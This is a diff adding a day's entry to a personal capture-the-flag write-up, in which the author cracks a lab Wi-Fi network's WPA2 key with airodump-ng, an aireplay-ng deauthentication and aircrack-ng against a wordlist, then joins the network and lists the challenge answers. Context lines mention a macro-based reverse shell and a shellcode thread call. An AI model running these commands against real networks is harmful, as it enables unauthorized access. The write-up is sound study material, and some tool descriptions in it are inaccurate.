@@ -312,3 +312,32 @@ $thandle = [CrtThread]::CreateThread(0, 0, $addr, 0, 0, 0)
 **Concepts:**
 - Understanding phishing attacks
 - Using msfconsole to create a document with a malicious macro and to get the reverse shell.
+
+# Day 11
+
+**Challenge:**
+- The challenge starts with checking any wireless configuration available using `iw dev`.
+- `sudo iw dev wlan2 scan` scans for available networks and shows the network with SSID (Service set identifier) `MalwareM_AP` and BSSID `02:00:00:00:00:00`. 
+- To switch to monitor mode (which is used for network analysis & security auditing), the following commands had to be executed - `sudo ip link set dev wlan2 down`, `sudo iw dev wlan2 set type monitor` & `sudo ip link set dev wlan2 up`.
+-  `sudo airodump-ng -c 6 --bssid 02:00:00:00:00:00 -w output-file wlan2`  captures traffic and saves the information.
+- Using `sudo aireplay-ng -0 1 -a 02:00:00:00:00:00 -c 02:00:00:00:01:00 wlan2`, the WPA handshake `02:00:00:00:00:00` is established in the first terminal.
+- On running `sudo aircrack-ng -a 2 -b 02:00:00:00:00:00 -w /home/glitch/rockyou.txt output*cap`, the PSK is found. 
+![day11.JPG](https://github.com/teayahz/cryptonite_taskphase_tia/blob/main/AOC24/img/day11.JPG?raw=true)
+- Now the commands `wpa_passphrase MalwareM_AP 'fluffy/champ24' > config` & `sudo wpa_supplicant -B -c config -i wlan2` had to be executed followed by `iw dev` which showed that the network `MalwareM_AP` had been joined.
+
+**Questions:**
+1. *What is the BSSID of our wireless interface?*
+**Answer:** 02:00:00:00:02:00. From `iw dev`
+
+2. *What is the SSID and BSSID of the access point?*
+**Answer:** MalwareM_AP, 02:00:00:00:00:00. Observed using `sudo iw dev wlan2 scan`
+
+3. *What is the BSSID of the wireless interface that is already connected to the access point?*
+**Answer:** 02:00:00:00:01:00. Using `sudo airodump-ng -c 6 --bssid 02:00:00:00:00:00 -w output-file wlan2` , value under `STATION`
+
+4. *What is the PSK after performing the WPA cracking attack?*
+**Answer:** fluffy/champ24. `sudo aircrack-ng -a 2 -b 02:00:00:00:00:00 -w /home/glitch/rockyou.txt output*cap`
+
+**Concepts:**
+- Wi-Fi and the WPA/WPA2 cracking attack which is based on a four-way handshake
+- airodump-ng which is used for pocket captures & aireplay-ng which is used for cracking WEP and WPA-PSK keys
